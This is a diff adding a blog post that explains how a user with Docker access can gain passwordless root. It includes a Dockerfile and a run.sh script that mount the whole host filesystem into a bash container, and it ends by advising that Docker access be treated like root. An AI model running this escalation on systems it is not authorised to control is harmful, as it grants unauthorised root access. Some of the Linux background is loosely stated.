@@ -1,0 +1,63 @@
+@%/site/head.html@
+@=header Passwordless privilege escalation with Docker@
+
+<p>I've been using Docker quite a bit recently, and I noticed that my Docker
+containers had more privileges than they should. If you didn't know, Docker is
+a tool to run applications in a container with an entirely isolated process
+group and filesystem and with resource limiting. The way this is done is through
+namespacing, chroots, and ulimit.</p>
+
+<p>In Linux, process groups isolated from everything else can be created with
+<a href=https://www.man7.org/linux/man-pages/man7/cgroups.7.html>cgroups</a>,
+a process can exist within an entirely separate filesystem with a
+<a href=https://www.man7.org/linux/man-pages/man1/chroot.1.html>chroot</a>, and
+a process group can be limited with
+<a href=https://docs.oracle.com/cd/E19683-01/816-0210/6m6nb7mo3/index.html>ulimit</a>.
+To my knowledge, it's not possible to create a chroot without root permissions,
+which makes sense for the traditional usage of chroots but is incredibly
+dangerous for something like Docker, because in a chroot, all file permissions
+are exactly the same as in the host filesystem.</p>
+
+<p>Going into chroots, they're not meant to be run by non-privileged users. A
+non-privileged user can pretty easily chroot into a specially crafted directory
+and perform privilege escalation, so chroots are limited to only the root user.
+The way Docker gets around this issue is by making every container run as root
+and making the user responsible for privilege de-escalation.</p>
+
+<p>This is the part where we get into the exploit. Docker allows for volume
+mounts, where a file is shared between a host system and a Docker container.
+This is to allow for a Docker container to do things like access a shared
+encryption key or to allow a Docker container to write logs to the host
+filesystem. If an unprivileged user has access to Docker, they can just mount
+the entire filesystem to a Docker image and run it to get root access to the
+entire system. To demonstrate, I wrote the following code:</p>
+
+<p>Dockerfile</p>
+
+<pre><code class=block>@\
+FROM scratch
+ENTRYPOINT /bin/bash
+@</code></pre>
+
+<p>run.sh</p>
+
+<pre><code class=block>@\
+#!/bin/sh
+
+docker build . -t privesc
+
+MOUNTS=""
+for DIR in $(ls /) ; do
+	MOUNTS="${MOUNTS} -v /${DIR}:/${DIR}"
+done
+
+docker run ${MOUNTS} -it privesc
+@</code></pre>
+
+<p>This code creates a Docker image that just runs <code>/bin/bash</code>, and
+then runs that Docker image interactively with the entire filesystem mounted
+into said image. This effectively allows any user with Docker access to execute
+arbitrary code as root without inputting a password. If you're ever using
+Docker, remember to treat Docker access as seriously as root permissions.</p>
+
+@%/site/tail.html@
